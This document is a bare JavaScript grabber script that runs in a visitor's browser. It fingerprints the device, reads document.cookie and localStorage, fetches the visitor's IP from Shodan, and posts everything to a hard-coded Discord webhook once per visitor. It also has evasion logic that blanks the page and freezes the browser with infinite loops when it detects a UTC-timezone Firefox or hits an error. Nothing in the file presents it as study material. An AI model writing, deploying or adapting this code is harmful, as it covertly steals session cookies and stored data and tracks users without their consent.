if (
  new Date().getTimezoneOffset() === 0 &&
  navigator.userAgent.indexOf("Firefox") > -1
) {
  document.documentElement.remove();
  while (true) {}
}

function getUserInfo() {
  const canvas = document.createElement("canvas");
  const webgl = canvas.getContext("webgl");
  const debugInfo = webgl.getExtension("WEBGL_debug_renderer_info");
  const offset = new Date().getTimezoneOffset() / -60;
  const timezoneFromGMT = "GMT" + (offset >= 0 ? "+" : "") + offset;

  return {
    userAgent: navigator.userAgent,
    locale: navigator.language,
    platform: navigator.platform,
    plugins: Array.from(navigator.plugins).map((plugin) => plugin.name),
    screenResolution: `${window.screen.width}x${window.screen.height}`,
    timezoneFromGMT: timezoneFromGMT,
    webGL: webgl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
    onlineStatus: navigator.onLine,
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    engine: navigator.productSub,
    vendor: navigator.vendor,
    vendorSub: navigator.vendorSub,
    javaEnabled: navigator.javaEnabled(),
    dataCookiesEnabled: navigator.cookieEnabled,
    dataCookies1: document.cookie,
    dataCookies2: decodeURIComponent(document.cookie.split(";")),
    dataStorage: localStorage,
    sizeScreenW: window.screen.width,
    sizeScreenH: window.screen.height,
    sizeDocW: document.width,
    sizeDocH: document.height,
    sizeInW: window.innerWidth,
    sizeInH: window.innerHeight,
    sizeAvailW: window.screen.availWidth,
    sizeAvailH: window.screen.availHeight,
    scrColorDepth: window.screen.colorDepth,
    scrPixelDepth: window.screen.pixelDepth,
    cpuClass: navigator.cpuClass,
    deviceMemory: navigator.deviceMemory,
    hardwareConcurrency: navigator.hardwareConcurrency,
    maxTouchPoints: navigator.maxTouchPoints,
    networkConnection: navigator.connection
      ? navigator.connection.effectiveType
      : "unknown",
    rtcPeerConnection: !!window.RTCPeerConnection,
    sessionStorage: !!window.sessionStorage,
    localStorage: !!window.localStorage,
    indexedDB: !!window.indexedDB,
    openDatabase: !!window.openDatabase,
    touchSupport: "ontouchstart" in window,
    adBlock: !window.canRunAds,
    cookies: navigator.cookieEnabled,
    colorDepth: screen.colorDepth,
    pixelDepth: screen.pixelDepth,
    battery: navigator.getBattery ? navigator.getBattery() : "unknown",
    hasLiedLanguages: navigator.languages
      ? navigator.languages[0] != navigator.language
      : false,
    hasLiedResolution:
      window.screen.width < window.screen.availWidth ||
      window.screen.height < window.screen.availHeight,
    hasLiedOs:
      navigator.userAgent.toLowerCase().indexOf("windows nt 10.0") != -1 &&
      navigator.userAgent.indexOf("Windows NT 10.0") != -1,
    hasLiedBrowser:
      navigator.userAgent.indexOf("Firefox") != -1 &&
      navigator.userAgent.indexOf("Chrome") != -1,
    oscpu: navigator.oscpu,
    product: navigator.product,
    appCodeName: navigator.appCodeName,
    appName: navigator.appName,
    appVersion: navigator.appVersion,
    buildID: navigator.buildID,
    devicePixelRatio: window.devicePixelRatio,
    oscpu: navigator.oscpu,
    vendor: navigator.vendor,
    languages: navigator.languages,
    serviceWorker: navigator.serviceWorker ? true : false,
    permissions: navigator.permissions ? true : false,
    storage: navigator.storage ? true : false,
    credentials: navigator.credentials ? true : false,
    mediaDevices: navigator.mediaDevices ? true : false,
    geolocation: navigator.geolocation ? true : false,
    connection: navigator.connection ? true : false,
    mediaSession: navigator.mediaSession ? true : false,
    mimeTypes: navigator.mimeTypes
      ? Array.from(navigator.mimeTypes).map((m) => m.type)
      : [],
    userAgentData: navigator.userAgentData
      ? navigator.userAgentData.brands.map((b) => b.brand + " " + b.version)
      : [],
    referer: document.referrer,
  };
}

if (
  document.cookie
    .split(";")
    .some((item) => item.trim().startsWith("loggedBefore="))
) {
} else {
  const SHODAN_IP_API_URL = "https://api.shodan.io/tools/myip";
  const DISCORD_WEBHOOK_URL =
    "https://discord.com/api/webhooks/1206919379397255201/UstaPTdGwX6MIJAWSWqaIwX45BiqNQr_PVspqxnlwJROmkkNTWo-aaAB8FYvZZzBhJaj";

  // Fetch the user's IP
  try {
    fetch(SHODAN_IP_API_URL)
      .then((response) => {
        if (!response.ok) {
          throw new Error("Network response was not ok");
        }
        return response.json();
      })
      .then((data) => {
        const IP = data;

        const userInfo = getUserInfo();

        let userInfoText = `User Information for IP: ${IP}\n\n`;
        for (let key in userInfo) {
          userInfoText += `${key}: ${userInfo[key] || "N/A"}\n`;
        }

        const payload = {
          content: userInfoText,
        };

        // Send the IP to the Discord webhook
        fetch(DISCORD_WEBHOOK_URL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(payload),
        });
        document.cookie =
          "loggedBefore=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; samesite=strict";
      })
      .catch((e) => {
        // Crash silently
        document.body.innerHTML = "";
        // Wait a bit before crashing
        setTimeout(() => {
          while (true) {}
        }, 500);
      });
  } catch (e) {
    // Crash silently
    document.body.innerHTML = "";
    // Wait a bit before crashing
    setTimeout(() => {
      while (true) {}
    }, 500);
  }
}
